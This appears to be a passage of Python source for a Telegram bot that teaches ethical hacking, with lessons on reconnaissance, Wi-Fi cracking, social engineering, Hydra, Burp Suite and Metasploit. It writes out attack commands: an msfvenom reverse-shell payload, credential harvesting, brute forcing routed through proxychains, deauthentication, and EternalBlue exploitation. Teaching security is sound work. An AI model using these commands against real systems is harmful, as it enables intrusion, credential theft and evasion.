from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler,MessageHandler, filters
import difflib
import os
from dotenv import load_dotenv
load_dotenv()

TOKEN = os.getenv("BOT_TOKEN")
# Topics configuration
topics = {
    "main": [
        ("🛡️ Basic Hacking", "basic"),
        ("⚙️ Advanced Hacking", "advanced"),
        ("🛠️ Tools & Installation", "tools"),
        ("📈 Career & Certifications", "career"),
        ("🚀 Start Hacking", "Start"),
    ],

    "basic": [
        ("What is Ethical Hacking?", "WIH"),
        ("Types of Hackers", "TOH"),
        ("Steps for hacking", "SFH"),
        ("Reconnaissance", "REC"),
        ("Networking", "networking"),
        ("Linux Commands", "LC"),
        ("Installing Kali Linux", "IKL"),
        ("Interesting Linux Commands", "ILC")
    ],

    "Start": [(f"📅 Day {i}", f"day{i}") for i in range(1, 31)],

    "advanced": [
        ("🖥️ System Hacking", "system"),
        ("🧠 Social Engineering", "social"),
        ("📡 Recon & Info Gathering", "recon"),
        ("🧪 Penetration Testing", "pentesting"),
        ("📶 Wi-Fi & Network Hacking", "wifi"),
        ("📱 Mobile Hacking", "mobile"),
        ("💻 Linux & Terminal Setup", "linux"),
        ("🔐 Cryptography", "crypto"),
        ("🕵️ Vulnerability Assessment", "vuln"),
        ("🧰 Payloads & Exploits", "payloads"),
        ("🌐 Website Testing", "web"),
        ("☁️ Cloud Hacking", "cloud"),
        ("🦠 Malware Analysis", "malware")
    ],

    "tools": [
        ("🔍 Nmap", "nmap"),
        ("🌐 Wireshark", "wireshark"),
        ("🔑 Hydra", "hydra"),
        ("🧪 Burp Suite", "burpsuite"),
        ("📦 Metasploit", "metasploit"),
        ("🛡️ Nikto", "nikto"),
        ("🕷️ SQLMap", "sqlmap"),
        ("🔧 John the Ripper", "john"),
        ("📱 MobSF", "mobsf"),
        ("📡 Aircrack‑ng", "aircrackng"),
        ("🧰 Ghidra", "ghidra")
    ],
    "career": [
        ("Why Choose Ethical Hacking?", "why_career"),
        ("Top Ethical Hacking Certifications", "certs"),
        ("Roadmap to Become an Ethical Hacker", "roadmap"),
        ("Job Roles & Salaries", "jobs"),
        ("Career Tips & Resources", "career_tips")
    ],

}

content = {
    "basic": "*🛡️ Basic Hacking Topics:*\n\nBegin your journey into the world of ethical hacking. Choose a foundational topic to build your skills and unlock the path to becoming a cybersecurity expert.",

    "WIH": "*🛡️ What is Ethical Hacking?*\n\n"
           "Ethical hacking is the authorized practice of bypassing system security to identify potential threats and vulnerabilities in a network or system. "
           "Organizations hire ethical hackers to simulate cyberattacks and discover weak points that could be exploited by malicious actors.\n\n"
           "*Goals:*\n"
           "- Strengthen system defenses\n"
           "- Prevent unauthorized access\n"
           "- Ensure compliance with security standards\n"
           "- Minimize risks before real attackers exploit them\n\n"
           "✅ Ethical hacking is legal, authorized, and follows a code of conduct unlike malicious hacking.",

    "TOH": "*🎭 Types of Hackers:*\n\n"
           "1. *White Hat Hackers*: Cybersecurity professionals who legally hack systems to strengthen security.\n"
           "2. *Black Hat Hackers*: Criminal hackers who exploit systems for financial gain, disruption, or theft.\n"
           "3. *Gray Hat Hackers*: Operate in the gray area — they may hack without permission but don’t have malicious intent.\n"
           "4. *Script Kiddies*: Inexperienced individuals who use pre-built tools or scripts without understanding how they work.\n"
           "5. *Hacktivists*: Hackers motivated by political or social causes, aiming to promote agendas or protest.\n"
           "6. *State-Sponsored Hackers*: Work for governments to attack or defend against foreign threats.\n"
           "7. *Red Team vs. Blue Team Hackers*: Red teams simulate attacks; blue teams defend against them.",

    "SFH": "*🧱 Steps for Hacking (Cyber Kill Chain):*\n\n"
           "1. *Reconnaissance*: Gathering information about the target (passive and active scanning).\n"
           "2. *Scanning*: Identifying live systems, ports, and services using tools like Nmap or Nessus.\n"
           "3. *Gaining Access*: Exploiting known vulnerabilities (e.g., using Metasploit).\n"
           "4. *Maintaining Access*: Installing malware or creating backdoors for persistent access.\n"
           "5. *Clearing Tracks*: Deleting logs and hiding malicious files to avoid detection.\n"
           "6. *Post-Exploitation*: Data exfiltration, lateral movement, or privilege escalation.\n"
           "7. *Reporting*: (In ethical hacking) Documenting findings and suggesting fixes.",

    "REC": "*🔍 Reconnaissance (Footprinting):*\n\n"
           "The first phase of ethical hacking where the goal is to gather as much data as possible about the target without alerting them.\n\n"
           "*Types:*\n"
           "- Passive: Public sources like WHOIS, search engines, social media.\n"
           "- Active: Direct interaction like port scanning, DNS queries.\n\n"
           "*Common Tools:*\n"
           "- `whois`, `nslookup`: DNS and domain details\n"
           "- `theHarvester`: Email & subdomain harvesting\n"
           "- `Maltego`: Visual data mining\n"
           "- `Recon-ng`, `Shodan`, `Google Dorking`\n\n"
           "🎯 Goal: Map the target’s attack surface.",

    "networking": "*🌐 Networking Essentials for Hackers:*\n\n"
                  "A strong understanding of networking is crucial in ethical hacking. It helps you understand how systems communicate and where vulnerabilities may exist.\n\n"
                  "*Topics to Master:*\n"
                  "- OSI & TCP/IP Models\n"
                  "- IP Addressing & Subnetting\n"
                  "- TCP vs UDP Protocols\n"
                  "- ARP, ICMP, DNS, DHCP\n"
                  "- Common Ports: 21 (FTP), 22 (SSH), 80 (HTTP), 443 (HTTPS), etc.\n\n"
                  "*Useful Networking Commands:*\n"
                  "`ping`, `traceroute`, `ipconfig/ifconfig`, `netstat`, `nslookup`, `nmap`\n\n"
                  "*Packet Analysis Tool:* `Wireshark`\n"
                  "*Port Scanner:* `Nmap`",

    "LC": "*🐧 Essential Linux Commands for Hackers:*\n\n"
          "Linux is the preferred OS for hackers due to its flexibility, scripting power, and open-source nature.\n\n"

          "*🔹 File & Directory Commands:*\n"
          "`ls` – List directory contents  →  `ls -la`\n"
          "`cd` – Change directory  →  `cd /etc`\n"
          "`dir` – List contents of directory  →  `dir /home`\n"
          "`pwd` – Print current working directory  →  `pwd`\n"
          "`mkdir` – Make new directory  →  `mkdir new_folder`\n"
          "`rmdir` – Remove empty directory  →  `rmdir old_folder`\n"
          "`rm` – Remove file/directory  →  `rm -rf file.txt`\n"
          "`mv` – Move or rename files  →  `mv old.txt new.txt`\n"
          "`cp` – Copy files/directories  →  `cp file.txt /tmp/`\n\n"

          "*🔐 Permissions & Ownership:*\n"
          "`chmod` – Change file permissions  →  `chmod 755 script.sh`\n"
          "`chown` – Change file owner/group  →  `chown ankit:admin file.txt`\n"
          "`chgrp` – Change group ownership  →  `chgrp devs file.txt`\n"
          "`umask` – Set default permission mask  →  `umask 0022`\n"
          "`chmod +x script.sh` – Make script executable\n\n"

          "*🌐 Networking Tools:*\n"
          "`ifconfig` – View/modify network interfaces  →  `ifconfig eth0 down`\n"
          "`ip` – Manage IP, routes, interfaces  →  `ip addr show`\n"
          "`netstat` – Show active connections and ports  →  `netstat -tuln`\n"
          "`ping` – Check connectivity  →  `ping -c 4 google.com`\n"
          "`curl` – Transfer data from or to a server  →  `curl -I https://example.com`\n"
          "`wget` – Download files from the internet  →  `wget -c https://site.com/file.iso`\n"
          "`dig` – DNS lookup and domain info  →  `dig +short openai.com`\n\n"

          "*⚙️ System & Process Management:*\n"
          "`ps` – Show running processes  →  `ps aux`\n"
          "`top` – Real-time system monitor  →  `top`\n"
          "`kill` – Terminate a process  →  `kill 1234`\n"
          "`htop` – Enhanced process viewer (needs install)  →  `htop`\n"
          "`df` – Show disk usage  →  `df -h`\n"
          "`du` – Show directory size  →  `du -sh /home/user`\n"
          "`uptime` – Show system uptime and load  →  `uptime`\n\n"

          "*📝 Viewing & Editing Files:*\n"
          "`cat` – Display file content  →  `cat file.txt`\n"
          "`less` – Scroll through file content  →  `less bigfile.log`\n"
          "`nano` – Simple terminal editor  →  `nano notes.txt`\n"
          "`vi` – Powerful text editor  →  `vi config.sh`\n"
          "`grep` – Search for patterns in files  →  `grep 'error' log.txt`\n"
          "`find` – Locate files by name or type  →  `find / -name \"*.conf\"`\n\n"

          "*💡 Scripting & Automation:*\n"
          "`bash` – Shell scripting language  →  Automate tasks using `.sh` scripts\n"
          "`cron` – Schedule repetitive tasks  →  `crontab -e`\n"
          "`expect` – Automate interactive shell sessions  →  Automate SSH, FTP, etc.\n\n",

    "ILC": "*🐧 Interesting Linux Commands for Hackers:*\n\n"
           "*😎 Fun & Hacker-Style Terminal Commands:*\n"
           "`cowsay 'Hack the planet!'` – Talking ASCII cow 🐄\n"
           "`sl` – Steam locomotive when you mistype `ls`\n"
           "`cmatrix` – Matrix rain effect 💻\n"
           "`lolcat` – Rainbow-colored output 🌈\n"
           "`figlet HACKER` – Big ASCII banners\n"
           "`toilet H4cker` – Styled ASCII text art\n"
           "`oneko` – Cat chases your cursor 🐱\n"
           "`aafire` – Burning fire in terminal 🔥\n"
           "`asciiquarium` – ASCII aquarium 🐠\n"
           "`fortune | cowsay | lolcat` – Fortune cow combo 🐄🌈\n"
           "`telnet towel.blinkenlights.nl` – Watch Star Wars in ASCII ⭐\n"
           "`rev`, `yes`, `cal`, `uptime`, `date`, `watch` – Quirky tools\n"
           "`hollywood` – Simulated hacker terminal effect 🎬\n"
           "`hacker` – Show off with animated hacking look\n\n"
           "you can install this all command by \n\n"
           "`sudo apt install cowsay lolcat sl cmatrix figlet toilet fortune aafire oneko asciiquarium hollywood` \n\n"
           "*🔥 Tip:* You can combine fun tools with `lolcat` for extra flair. Try `figlet Hello | lolcat`!",

    "IKL": "*💻 Installing Kali Linux (Step-by-Step):*\n\n"
           "Kali Linux is a Debian-based distribution packed with pre-installed security tools.\n\n"
           "*1. Download ISO:*\n"
           "- Official site: [https://www.kali.org](https://www.kali.org)\n\n"
           "*2. Create Bootable USB:*\n"
           "- Use `Rufus` (Windows) or `Balena Etcher` (Linux/macOS)\n\n"
           "*3. Install Kali:*\n"
           "- Boot your system from the USB\n"
           "- Follow on-screen installation steps (language, time, disk partitioning, etc.)\n\n"
           "*4. Post-Installation:*\n"
           "- Update system:\n"
           "  `sudo apt update && sudo apt upgrade`\n"
           "- Install guest additions (if using VirtualBox):\n"
           "  `sudo apt install virtualbox-guest-utils`\n\n"
           "*5. Run in Virtual Machine (Optional):*\n"
           "- Use VirtualBox or VMware for dual-boot-free experience.\n\n"
           "🎯 *Recommended*: Use a VM if you're a beginner to avoid damaging your primary system.",

    "advanced": "*🔍 Advanced Hacking Topics:*\n\nDive deep into real-world offensive techniques. Select a topic:",

    "system": "*🔐 System Hacking:* (Windows/Linux)\n\n📌 Key Phases:\n"
              "- *Gaining Access*: Weak creds, unpatched services, malware\n"
              "- *Privilege Escalation*: Sudo misconfigurations, kernel exploits, token impersonation\n"
              "- *Maintaining Access*: Backdoors, scheduled tasks, services\n"
              "- *Clearing Tracks*: Modify event logs, timestamps (e.g., Timestomp)\n\n"
              "🛠 Tools: `mimikatz`, `winPEAS`, `linPEAS`, `chntpw`, `meterpreter`\n"
              "💡 *Example*: `net user administrator /active:yes` enables built-in admin on Windows.",

    "social": "*🎭 Social Engineering:*\n\nTarget human trust and behavior.\n📌 Techniques:\n"
              "- *Phishing*: Fake emails/websites to steal credentials\n"
              "- *Baiting*: Malware-infected USB drops\n"
              "- *Impersonation*: Posing as trusted person\n\n"
              "🛠 Tool: `setoolkit`\n"
              "💡 *Workflow*: `sudo setoolkit` → Social‑Engineering Attacks → Credential Harvester → Mock site → Collect creds.",

    "recon": "*🔎 Recon & Info Gathering:*\n\nPhase aims to build a complete map of the target environment.\n📌 Use Cases:\n"
             "- Domain registration: `whois example.com`\n"
             "- DNS entry collection: `nslookup`, `dig`, `dnsenum`\n"
             "- IoT & device fingerprinting: `shodan host 1.2.3.4`\n"
             "- Directory enumeration: `dirb http://target.com`\n\n"
             "Outcome: A complete blueprint for attack planning.",

    "pentesting": "*🧪 Penetration Testing Structure:*\n\nA methodical approach to simulate cyber-attacks.\n📌 Types:\n"
                  "- *Blackbox*: No prior intel\n"
                  "- *Graybox*: Partial access/info\n"
                  "- *Whitebox*: Full system data\n\n"
                  "📘 Phases:\n"
                  "1. Planning & Scoping\n2. Recon & Scanning\n3. Exploitation\n4. Post‑Exploitation\n5. Reporting & Remediation\n\n"
                  "⚙️ Tools: Metasploit, Burp Suite, Nmap, SQLmap, Nikto",

    "wifi": "*📶 Wi‑Fi & Wireless Attacks:*\n\nHack local wireless networks.\n📌 Steps:\n"
            "1. Enable monitor mode: `airmon-ng start wlan0`\n"
            "2. Capture handshakes: `airodump-ng wlan0mon`\n"
            "3. Deauth to force clients to reconnect: `aireplay-ng -0 5 -a <BSSID> wlan0mon`\n"
            "4. Crack WPA/WPA2: `aircrack-ng -w wordlist.txt capture.cap`\n\n"
            "⚙️ Tools: aircrack-ng suite, hashcat, reaver, wash",

    "mobile": "*📱 Mobile Hacking:*\n\nExplore app exploitation & analysis.\n📌 Topics:\n"
              "- *Static Analysis*: Reverse-engineer APK using `APKTool`\n"
              "- *Dynamic*: Use `Frida`, `Xposed`\n"
              "- *RATs & Spyware*: `AndroRAT`, custom payloads\n\n"
              "⚙️ Framework: `MobSF` – upload APK, receive vulnerability report.\n"
              "`./setup.sh` → open http://localhost:8000 → scan APK/IPA",

    "linux": "*🐧 Linux & Terminal Foundations:*\n\nLearn advanced shell usage and scripting.\n📌 Essentials:\n"
             "- Terminal commands and directory structure\n"
             "- Permissions & SUID bits\n"
             "- Automating tasks via bash scripts and cron jobs\n\n"
             "💡 Example script:\n```bash\n#!/bin/bash\n# scan host\nnmap -sS $1\n```",

    "crypto": "*🔐 Cryptography Practical Guide:*\n\nSafeguard communication/data.\n📌 Topics:\n"
              "- *Hashing* (MD5/SHA256) for integrity checks\n"
              "- *Symmetric Encryption* (AES)\n"
              "- *Asymmetric Encryption* (RSA, ECC)\n\n"
              "🛠 Tools: `openssl`, `gpg`, `hashcat`\n"
              "`echo -n password | sha256sum`\n"
              "`openssl enc -aes-256-cbc -salt -in file.txt -out file.enc`",

    "vuln": "*🛡️ Vulnerability Assessment:*\n\nScan and identify possible weak points.\n📌 Techniques:\n"
            "- *Automated scans*: Nmap scripts, Nessus, OpenVAS\n"
            "- *Manual reviews*: Code, logic, auth flows\n\n"
            "🛠 Commands:\n"
            "`nmap --script vuln -p80,443 target.com`\n"
            "`nikto -h http://target.com`",

    "payloads": "*💥 Payloads & Exploits:*\n\nGenerate attack vectors using msfvenom.\n📌 Workflow:\n"
                "1. Select payload type (reverse shell)\n"
                "2. Generate binary/script\n"
                "3. Serve it and catch a session via Metasploit\n\n"
                "Example:\n"
                "`msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe > shell.exe`",

    "web": "*🌐 Website Security Testing:*\n\nIdentify and test web vulnerabilities.\n📌 Focus Areas:\n"
           "- SQL Injection (SQLi)\n"
           "- Cross‑Site Scripting (XSS)\n"
           "- Cross‑Site Request Forgery (CSRF)\n"
           "- Insecure file uploads, LFI/RFI\n\n"
           "🛠 Tools:\n"
           "`sqlmap -u \"http://target.com/?id=1\" --dbs`\n"
           "Burp Suite with Scanner/Repeater modules\n"
           "`nikto` for server misconfigurations",

    "cloud": "*☁️ Cloud Hacking:*\n\nCloud environments (like AWS, Azure, GCP) can be misconfigured, making them vulnerable.\n\n🔐 *Key Techniques:*\n- Misconfiguration Exploits (e.g., public S3 buckets)\n- IAM Abuse (privilege escalation)\n- Metadata API Exploitation\n\n🛠 *Tools:*\n- `ScoutSuite`: Multi-cloud security auditing tool.\n- `Pacu`: AWS exploitation framework.\n\n💡 *Example Attack:*\n- Enumerating IAM roles:\n`aws iam list-roles`\n- Exploiting metadata service:\n`curl http://169.254.169.254/latest/meta-data/`",

    "malware": "*🦠 Malware Analysis:*\n\nMalware analysis helps understand how malicious software works and how to detect/remove it.\n\n🧪 *Techniques:*\n- Static Analysis (without execution)\n- Dynamic Analysis (during execution)\n- Reverse Engineering\n\n🛠 *Tools:*\n- `Ghidra`, `IDA Pro`, `PEStudio`, `VirusTotal`\n\n💡 *Tips:*\n- Use virtual machines (VMs) for safety.\n- Monitor file/registry/network behavior during execution.\n\n🔍 *Example Static Check:*\n`strings malware.exe | less`",

    "tools": "*🧰 Tools & Software Submenu:*\n\nSelect a tool to explore installation, real-world usage, examples, and pro tips.",

    "nmap": "*🔍 Nmap* – Network Scanner & Port Mapper\n\n"
            "🧠 *What is Nmap?*\n"
            "Nmap (Network Mapper) is a powerful open-source tool for network discovery, security auditing, and enumeration.\n"
            "It scans systems to identify open ports, running services, OS versions, and possible vulnerabilities.\n\n"

            "🛠 *Installation:*\n"
            "*Linux (Debian/Ubuntu):*\n"
            "`sudo apt update && sudo apt install nmap`\n"
            "*Kali Linux:* Pre-installed\n"
            "*Windows/macOS:* [https://nmap.org/download.html](https://nmap.org/download.html)\n\n"

            "📦 *Basic Syntax:*\n"
            "`nmap [options] <target>`\n"
            "Examples:\n"
            "`nmap 192.168.1.1`\n"
            "`nmap scanme.nmap.org`\n\n"

            "📡 *Basic Scanning Commands:*\n"
            "- Ping Scan (Check if host is up):\n"
            "`nmap -sn 192.168.1.0/24`\n"
            "- Quick Port Scan:\n"
            "`nmap -F 192.168.1.1`\n"
            "- Service Version Detection:\n"
            "`nmap -sV 192.168.1.1`\n"
            "- Operating System Detection:\n"
            "`nmap -O 192.168.1.1`\n"
            "- Full Scan:\n"
            "`nmap -sS -sV -O -Pn 192.168.1.1`\n\n"

            "🎯 *Useful Scan Types:*\n"
            "- SYN Scan (Stealth): `-sS`\n"
            "- UDP Scan: `-sU`\n"
            "- TCP Connect Scan: `-sT`\n"
            "- Aggressive Scan: `-A`\n"
            "- No DNS resolution: `-n`\n"
            "- Skip ping check: `-Pn`\n\n"

            "🧠 *Targeting Options:*\n"
            "- Single IP: `192.168.1.10`\n"
            "- Range: `192.168.1.1-50`\n"
            "- CIDR: `192.168.1.0/24`\n"
            "- Hostname: `scanme.nmap.org`\n"
            "- Input from file: `-iL targets.txt`\n\n"

            "🔍 *Detecting Vulnerabilities:*\n"
            "Use with NSE scripts:\n"
            "`nmap --script vuln 192.168.1.1`\n"
            "Some useful scripts:\n"
            "- `http-vuln-*`\n"
            "- `smb-vuln-*`\n"
            "- `ftp-anon`, `ssh2-enum-algos`\n\n"

            "📁 *Output Formats:*\n"
            "- Normal: `-oN scan.txt`\n"
            "- XML: `-oX scan.xml`\n"
            "- Grepable: `-oG scan.grep`\n"
            "- All at once: `-oA fullscan`\n\n"

            "🧪 *Real-World Practice Tasks:*\n"
            "✅ Scan your local network for live hosts\n"
            "✅ Identify open ports and running services on your own system\n"
            "✅ Use `-A` on a known host to analyze services\n"
            "✅ Try `--script vuln` against a vulnerable VM like Metasploitable\n\n"

            "🛡️ *Ethical Usage Reminder:*\n"
            "⚠️ Only scan systems you own or have explicit permission to test.\n"
            "Unauthorized scanning is illegal and may trigger firewalls or alerts.\n\n"

            "💡 *Pro Tips:*\n"
            "- Combine `-T4` for faster scanning\n"
            "- Use `--top-ports 100` for common ports\n"
            "- Chain scans with tools like `Nikto`, `Hydra`, or `Metasploit`\n"
            "- Use `Zenmap` GUI for visual analysis (if preferred)\n\n"

            "🏁 *Conclusion:*\n"
            "Nmap is a must-have tool for any ethical hacker, penetration tester, or sysadmin. It uncovers vital details about network infrastructure.\n"
            "_Explore the invisible. Map the network. Master Nmap._ 🌐🧠",

    "wireshark": "*🌐 Wireshark* – Network Packet Sniffing Tool\n\n"
            "🧠 *What is Wireshark?*\n"
            "Wireshark is a powerful open-source packet analyzer used for:\n"
            "- Network troubleshooting\n"
            "- Protocol development\n"
            "- Ethical hacking & traffic inspection\n\n"

            "📦 *Features:*\n"
            "- Captures real-time network packets\n"
            "- Decodes protocols (TCP, UDP, HTTP, DNS, ARP, etc.)\n"
            "- Deep packet inspection with GUI & filters\n\n"

            "🛠 *Installation:*\n"
            "*Windows/macOS:* [Download](https://www.wireshark.org/download.html)\n"
            "*Linux (Debian/Ubuntu):*\n"
            "`sudo apt update && sudo apt install wireshark`\n"
            "`sudo usermod -aG wireshark $USER && newgrp wireshark`\n\n"

            "📚 *Basic Concepts:*\n"
            "- *Packet*: Small unit of transmitted data\n"
            "- *Capture Filter*: Filters packets during capture\n"
            "- *Display Filter*: Filters after capture\n"
            "- *Interface*: Network device to monitor (e.g., eth0, wlan0)\n\n"

            "🧪 *How to Start Capturing:*\n"
            "1. Open Wireshark\n"
            "2. Choose interface (e.g., wlan0)\n"
            "3. Click the shark icon to begin\n"
            "4. Stop with the red square icon\n\n"

            "🎯 *Basic Display Filters:*\n"
            "`http` – Only HTTP\n"
            "`tcp` – TCP traffic\n"
            "`ip.src == 192.168.1.1` – Packets *from* IP\n"
            "`ip.dst == 192.168.1.100` – Packets *to* IP\n"
            "`dns` – DNS traffic\n"
            "`tcp.port == 80` – HTTP port\n\n"

            "🚀 *Capture Filters (before sniffing):*\n"
            "`tcp port 80` – Only HTTP\n"
            "`host 192.168.1.1` – Specific IP\n"
            "`src host 10.0.0.5` – Source IP only\n"
            "`net 192.168.0.0/24` – IP range\n\n"

            "🔍 *Deep Packet Inspection:*\n"
            "Click any packet → Expand headers:\n"
            "- Ethernet II\n"
            "- Internet Protocol (IP)\n"
            "- TCP/UDP headers\n"
            "- HTTP requests/responses\n\n"

            "🧠 *Hacking Use Cases:*\n"
            "- *Credential Sniffing:* Capture HTTP POST data\n"
            "- *Session Hijacking:* Look for cookies & tokens\n"
            "- *DNS Spoof Detection:* Multiple DNS replies\n"
            "- *MITM Analysis:* Inspect ARP poisoned traffic\n"
            "- *Backdoor Tracing:* Unknown C2 traffic/ports\n\n"

            "🛡️ *Ethical Guidelines:*\n"
            "⚠️ Only capture on networks you own or have permission to access.\n"
            "👨‍⚖️ Unauthorized sniffing is illegal and unethical.\n\n"

            "💻 *Practice Tasks:*\n"
            "• Capture login to testphp.vulnweb.com using POST filter:\n"
            "`http.request.method == \"POST\"`\n"
            "• Detect DNS to 8.8.8.8:\n"
            "`dns && ip.dst == 8.8.8.8`\n"
            "• View TCP 3-way handshake:\n"
            "`tcp.port == 80`\n\n"

            "🛠 *Expert Tips:*\n"
            "- Save captures as `.pcap`\n"
            "- Use coloring rules for traffic types\n"
            "- Combine filters:\n"
            "`tcp.port == 80 && ip.src == 192.168.1.5`\n"
            "- Export filtered packets: *File → Export Specified Packets*\n\n"

            "🎓 *Challenges:*\n"
            "1. Capture and extract queried domain from DNS\n"
            "2. Identify file download over HTTP\n"
            "3. Analyze TCP 3-way handshake\n"
            "4. Save packets to/from specific IP during download\n"
            "5. Detect SYN scan:\n"
            "`tcp.flags.syn == 1 && tcp.flags.ack == 0`\n\n"

            "🧩 *Bonus Tool: Tshark (CLI):*\n"
            "`tshark -i wlan0 -Y \"http\" -T fields -e ip.src -e http.request.uri`\n"
            "*Analyze .pcap files offline with GUI or CLI*\n\n"

            "🏁 *Conclusion:*\n"
            "Wireshark gives visibility into raw network traffic, helping ethical hackers spot vulnerabilities, monitor traffic, and reverse engineer attacks.\n"
            "_Master Wireshark, master the network!_ 🌐🛡️",

    "hydra": "*🔑 Hydra* – Brute Force Login Cracker\n\n"
            "🧠 *What is Hydra?*\n"
            "Hydra is a powerful password-cracking tool that supports rapid dictionary attacks against over 50 protocols and services such as FTP, SSH, Telnet, HTTP, SMB, and more.\n\n"

            "🛠 *Installation:*\n"
            "*Kali Linux:* Pre-installed\n"
            "*Debian/Ubuntu:*\n"
            "`sudo apt update && sudo apt install hydra`\n"
            "*Windows:* Use WSL or install via Cygwin\n\n"

            "📦 *Supported Protocols:*\n"
            "- FTP, SSH, Telnet\n"
            "- HTTP/HTTPS, SMB\n"
            "- RDP, VNC, POP3, IMAP\n"
            "- MySQL, MSSQL, PostgreSQL, and more\n\n"

            "📚 *Basic Syntax:*\n"
            "`hydra -L users.txt -P passwords.txt <protocol>://<target>`\n"
            "Example:\n"
            "`hydra -L userlist.txt -P passlist.txt ssh://192.168.1.10`\n\n"

            "🔐 *Example Attacks:*\n"
            "- *FTP Brute Force:*\n"
            "`hydra -l admin -P rockyou.txt ftp://192.168.1.100`\n\n"
            "- *SSH Dictionary Attack:*\n"
            "`hydra -L users.txt -P passwords.txt ssh://192.168.1.105`\n\n"
            "- *HTTP Form Brute Force:*\n"
            "`hydra -l admin -P pass.txt 192.168.1.200 http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=incorrect\"`\n\n"
            "- *RDP Attack (slow):*\n"
            "`hydra -t 1 -V -f -L users.txt -P pass.txt rdp://192.168.1.50`\n\n"

            "⚙️ *Important Flags:*\n"
            "- `-l` → single username\n"
            "- `-L` → username list\n"
            "- `-p` → single password\n"
            "- `-P` → password list\n"
            "- `-s` → port number\n"
            "- `-f` → stop after first valid login\n"
            "- `-V` → verbose output\n"
            "- `-t` → tasks (parallel threads)\n\n"

            "📁 *Useful Wordlists:*\n"
            "- `/usr/share/wordlists/rockyou.txt`\n"
            "- Custom lists with `cewl`, `crunch`, or `cupp`\n\n"

            "🎯 *Real-World Use Cases:*\n"
            "✅ Penetration testing SSH login strength\n"
            "✅ Testing weak FTP credentials on embedded devices\n"
            "✅ Brute-forcing insecure web logins\n"
            "✅ Finding default creds in IoT/routers\n\n"

            "🧠 *Tips & Tricks:*\n"
            "- Always check for rate limiting or CAPTCHA on web logins\n"
            "- Combine with `nmap` to detect open ports/services before launching attack\n"
            "- Use proxychains to anonymize (e.g., via Tor)\n"
            "`proxychains hydra -L users.txt -P pass.txt ssh://target`\n\n"

            "🚨 *Ethical Notice:*\n"
            "Only use Hydra on systems you *own* or are *authorized* to test.\n"
            "Unauthorized attacks are *illegal and unethical*.\n\n"

            "🏁 *Conclusion:*\n"
            "Hydra is a versatile and effective tool for brute-force login testing across many services. With proper targeting and lists, it’s a core tool in every ethical hacker’s arsenal.\n"
            "_If there's a login, Hydra can try to break in — ethically._ 🔐🧠",

    "burpsuite": "*🧪 Burp Suite* – Web Application Security Testing Tool\n\n"
                "🧠 *What is Burp Suite?*\n"
                "Burp Suite is a powerful web vulnerability scanner and proxy tool used by ethical hackers to test and exploit web applications. It allows interception, manipulation, scanning, and exploitation of HTTP/S traffic.\n\n"

                "🛠 *Installation:*\n"
                "\"- Kali Linux: Pre-installed\"\n"
                "\"- Debian/Ubuntu: `sudo apt install burpsuite`\"\n"
                "\"- Windows/macOS: Download from https://portswigger.net/burp\"\n\n"

                "🌐 *How Burp Works:*\n"
                "\"- Acts as a proxy between your browser and target site\"\n"
                "\"- Intercepts and modifies HTTP/S requests and responses\"\n"
                "\"- Analyzes and exploits vulnerabilities like XSS, SQLi, CSRF, etc.\"\n\n"

                "🧩 *Key Components:*\n"
                "\"- Proxy: Intercept web traffic\"\n"
                "\"- Repeater: Modify and resend requests\"\n"
                "\"- Intruder: Automate attacks like brute force\"\n"
                "\"- Scanner (Pro): Automatically find vulnerabilities\"\n"
                "\"- Decoder: Encode/decode data (Base64, URL, Hex)\"\n"
                "\"- Comparer: Compare two requests/responses\"\n"
                "\"- Extender: Add extensions to increase power\"\n\n"

                "🔧 *Setup Burp Proxy:*\n"
                "\"- Open Burp → Proxy tab → Intercept → On\"\n"
                "\"- Set browser proxy to 127.0.0.1:8080\"\n"
                "\"- Import Burp CA certificate to browser for HTTPS\"\n\n"

                "🛠️ *Basic Usage Workflow:*\n"
                "\"1. Configure browser to use Burp proxy\"\n"
                "\"2. Browse the target application\"\n"
                "\"3. Intercept and inspect traffic in 'Proxy' tab\"\n"
                "\"4. Send requests to 'Repeater' or 'Intruder'\"\n"
                "\"5. Modify, replay, brute-force, or scan requests\"\n\n"

                "🎯 *Use Cases for Hackers:*\n"
                "\"- Bypass client-side validations\"\n"
                "\"- Find SQL Injection points manually\"\n"
                "\"- Exploit XSS vulnerabilities\"\n"
                "\"- Fuzz parameters using Intruder\"\n"
                "\"- Capture and reuse session tokens\"\n\n"

                "📚 *Practical Tasks:*\n"
                "✅ Intercept and modify a login POST request\n"
                "✅ Change a product price in a cart request\n"
                "✅ Perform brute force using Intruder with wordlist\n"
                "✅ Replay a CSRF request using Repeater\n"
                "✅ Analyze cookies and headers for security flaws\n\n"

                "💡 *Pro Tips:*\n"
                "\"- Use Repeater to understand backend responses\"\n"
                "\"- Use extensions like 'AuthMatrix', 'Logger++', 'Turbo Intruder'\"\n"
                "\"- Combine with browser plugins like FoxyProxy\"\n"
                "\"- Use Burp Collaborator to detect blind vulnerabilities\"\n\n"

                "🚨 *Legal Note:*\n"
                "Only test applications that you own or are authorized to assess.\n"
                "Unauthorized scanning and interception is illegal.\n\n"

                "🏁 *Conclusion:*\n"
                "Burp Suite is the ultimate toolkit for web app pentesting. Master it and you'll uncover what web developers hide.\n"
                "_Inspect. Intercept. Exploit – the ethical way._ 🕵️‍♂️🌐",

    "metasploit": "*📦 Metasploit* – The Ultimate Exploitation Framework\n\n"
                "🧠 *What is Metasploit?*\n"
                "Metasploit is a powerful exploitation and post-exploitation framework used by ethical hackers to identify, exploit, and validate vulnerabilities.\n"
                "It includes payload generators, exploit modules, scanners, listeners, and more.\n\n"

                "🛠 *Installation:*\n"
                "\"- Kali Linux: Pre-installed\"\n"
                "\"- Ubuntu/Debian: `sudo apt install metasploit-framework`\"\n"
                "\"- Windows/macOS: https://www.metasploit.com/\"\n\n"

                "🚀 *Start Metasploit:*\n"
                "`msfconsole`\n"
                "Wait for it to load the modules.\n\n"

                "🔍 *Basic Workflow:*\n"
                "\"1. Find a target vulnerability\"\n"
                "\"2. Select an exploit module\"\n"
                "\"3. Set the payload (e.g., reverse shell)\"\n"
                "\"4. Configure options (RHOST, LHOST, PORT, etc.)\"\n"
                "\"5. Launch the exploit\"\n\n"

                "⚙️ *Example Attack:*\n"
                "`use exploit/windows/smb/ms17_010_eternalblue`\n"
                "`set RHOST 192.168.1.105`\n"
                "`set PAYLOAD windows/x64/meterpreter/reverse_tcp`\n"
